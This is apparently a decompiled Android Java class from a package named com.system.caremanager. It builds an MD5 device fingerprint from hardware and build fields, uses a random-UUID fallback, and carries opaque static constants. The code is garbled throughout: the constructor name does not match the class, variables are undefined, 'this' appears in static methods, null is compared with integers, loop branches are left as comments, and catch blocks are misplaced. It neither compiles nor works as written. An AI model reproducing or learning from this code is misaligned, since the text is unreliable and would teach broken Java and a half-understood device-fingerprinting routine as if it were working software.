package com.system.caremanager;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class AppScanner {

    public static String FTX0 = ".Confg";
    public static String FTX1 = "NFHY";
    public static String FTX2 = "YLOV";
    public static String FTX3 = "QSVT";
    public byte[] byt;
    public String str;

    static {
        // Static initialization block
    }

    InstalledAppsScanner(byte[] param1, byte[] param2) {
        try {
            this.str = null;
            this.byt = null;
            String string = new String();
            String str = "UTF-8";
            this.str = string;
            this.byt = param2;
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    public static String GD_I(Context param1) {
        try {
            StringBuilder stringBuilder = new StringBuilder();
            String str = "35";
            String BOARD = Build.BOARD;
            int result = BOARD.length();
            int val = 10;
            int result2 = InstalledAppsScanner.is_ten(str2, val);
            int val2 = result % v3;
            StringBuilder result3 = this.append(val2);
            String BRAND = Build.BRAND;
            int result4 = BRAND.length();
            int result5 = InstalledAppsScanner.is_ten(str2, val);
            int val3 = result % v3;
            StringBuilder result6 = this.append(val3);
            String CPU_ABI = Build.CPU_ABI;
            int result7 = CPU_ABI.length();
            int result8 = InstalledAppsScanner.is_ten(str2, val);
            int val4 = result % v3;
            StringBuilder result9 = this.append(val4);
            String DEVICE = Build.DEVICE;
            int result10 = DEVICE.length();
            int result11 = InstalledAppsScanner.is_ten(str2, val);
            int val5 = result % v3;
            StringBuilder result12 = this.append(val5);
            String DISPLAY = Build.DISPLAY;
            int result13 = DISPLAY.length();
            int result14 = InstalledAppsScanner.is_ten(str2, val);
            int val6 = result % v3;
            StringBuilder result15 = this.append(val6);
            String HOST = Build.HOST;
            int result16 = HOST.length();
            int result17 = InstalledAppsScanner.is_ten(str2, val);
            int val7 = result % v3;
            StringBuilder result18 = this.append(val7);
            String ID = Build.ID;
            int result19 = ID.length();
            int result20 = InstalledAppsScanner.is_ten(str2, val);
            int val8 = result % v3;
            StringBuilder result21 = this.append(val8);
            String MANUFACTURER = Build.MANUFACTURER;
            int result22 = MANUFACTURER.length();
            int result23 = InstalledAppsScanner.is_ten(str2, val);
            int val9 = result % v3;
            StringBuilder result24 = this.append(val9);
            String MODEL = Build.MODEL;
            int result25 = MODEL.length();
            int result26 = InstalledAppsScanner.is_ten(str2, val);
            int val10 = result % v3;
            StringBuilder result27 = this.append(val10);
            String PRODUCT = Build.PRODUCT;
            int result28 = PRODUCT.length();
            int result29 = InstalledAppsScanner.is_ten(str2, val);
            int val11 = result % v3;
            StringBuilder result30 = this.append(val11);
            String TAGS = Build.TAGS;
            int result31 = TAGS.length();
            int result32 = InstalledAppsScanner.is_ten(str2, val);
            int val12 = result % v3;
            StringBuilder result33 = this.append(val12);
            String TYPE = Build.TYPE;
            int result34 = TYPE.length();
            int result35 = InstalledAppsScanner.is_ten(str2, val);
            int val13 = result % v3;
            StringBuilder result36 = this.append(val13);
            String USER = Build.USER;
            int result37 = USER.length();
            int result38 = InstalledAppsScanner.is_ten(str2, val);
            int val14 = result % v1;
            StringBuilder result39 = this.append(val14);
            String result40 = this.toString();
            String str3 = "MD5";
            MessageDigest result41 = MessageDigest.getInstance(str3);
            byte[] result42 = this.getBytes();
            int result43 = this.length();
            result.update(result, null, result);
            byte[] result44 = result.digest();
            String str4 = "";
            int len = result.length;
            if (null >= len) {
                // branch: cond_1
            }
            Object item = result[null];
            int val15 = item & 0xff;
            int val16 = 15;
            if (val15 > val16) {
                // branch: cond_0
            }
            StringBuilder stringBuilder2 = new StringBuilder();
            StringBuilder result45 = stringBuilder2.append(str4);
            String str5 = "0";
            StringBuilder result46 = stringBuilder2.append(str5);
            String result47 = stringBuilder2.toString();
            StringBuilder stringBuilder3 = new StringBuilder();
            StringBuilder result48 = stringBuilder3.append(result);
            String result49 = Integer.toHexString(val15);
            StringBuilder result50 = stringBuilder3.append(result);
            String result51 = stringBuilder3.toString();
            int val17 = null + 0x1;
            // continue loop -> :goto_0
            String result52 = result.toUpperCase();
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result53 = Boolean.valueOf(1);
            boolean result54 = this.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            Boolean result55 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result56 = this.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            Boolean result57 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result58 = this.booleanValue();
            if (result == null) {
                // branch: cond_4
            }
            Boolean result59 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            boolean result60 = this.booleanValue();
            if (result == null) {
                // branch: cond_5
            }
            Boolean result61 = Boolean.valueOf(null);
            // continue loop -> :goto_4
            UUID result62 = UUID.randomUUID();
            String result63 = this.toString();
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getRandomString(int param1, String param2) {
        Random random = new Random();
        StringBuilder stringBuilder = new StringBuilder();
        if (null >= param1) {
            // branch: cond_0
        }
        int result = param2.length();
        int result2 = random.nextInt(result);
        char result3 = param2.charAt(result);
        StringBuilder result4 = stringBuilder.append(result);
        int val = null + 0x1;
        // continue loop -> :goto_0
        String result5 = stringBuilder.toString();
        return result;
    }

    public static int is_ten(String param1, int param2) {
        int result = this.length();
        int val = 10;
        if (result <= val) {
            // branch: cond_0
        }
        return val;
        return param2;
    }

}